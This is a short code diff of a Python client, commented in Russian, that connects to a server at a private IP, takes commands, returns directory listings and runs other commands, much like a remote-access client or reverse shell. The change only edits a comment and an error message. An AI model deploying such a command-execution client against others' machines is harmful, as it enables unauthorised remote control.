@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # замените на IP вашего сервера
+SERVER_IP = "192.168.100.3"  # Замените на IP вашего сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -70,8 +70,8 @@ def main():
                                     files.append(e)
                             result = "\n".join(sorted(dirs) + sorted(files))
                             s.send(result.encode(errors='ignore'))
-                        except Exception as e:
-                            s.send(f"Ошибка получения списка: {e}".encode(errors='ignore'))
+                        except Exception:
+                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode(errors='ignore'))
 
                     else:
                         output = execute_command(cmd)
